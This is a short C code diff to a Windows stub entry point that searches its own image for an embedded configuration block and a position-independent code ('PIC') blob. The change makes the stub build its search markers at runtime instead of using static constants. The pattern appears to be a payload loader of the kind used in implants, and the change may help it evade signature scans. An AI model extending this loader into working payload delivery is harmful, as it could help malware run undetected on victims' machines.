@@ -62,7 +62,8 @@ void WinMainCRTStartup(void) {
 
     PBYTE b = (PBYTE)img_base;
 
-    PBYTE cp = stub_find_marker_in_image(b, img_size, CONFIG_MARKER, CONFIG_MARKER_LEN);
+    BUILD_CONFIG_MARKER(cfg_marker);
+    PBYTE cp = stub_find_marker_in_image(b, img_size, cfg_marker, CONFIG_MARKER_LEN);
     if (!cp) { g_stub_exit_code = 103; goto done; }
     g_stub_exit_code = 204;
 
@@ -73,7 +74,8 @@ void WinMainCRTStartup(void) {
     if (cfg_len == 0 || cfg_len > cfg_max) { g_stub_exit_code = 104; goto done; }
     g_stub_exit_code = 205;
 
-    PBYTE pp = stub_find_marker_in_image(b, img_size, PIC_MARKER, PIC_MARKER_LEN);
+    BUILD_PIC_MARKER(pic_marker);
+    PBYTE pp = stub_find_marker_in_image(b, img_size, pic_marker, PIC_MARKER_LEN);
     if (!pp) { g_stub_exit_code = 105; goto done; }
     g_stub_exit_code = 206;
 
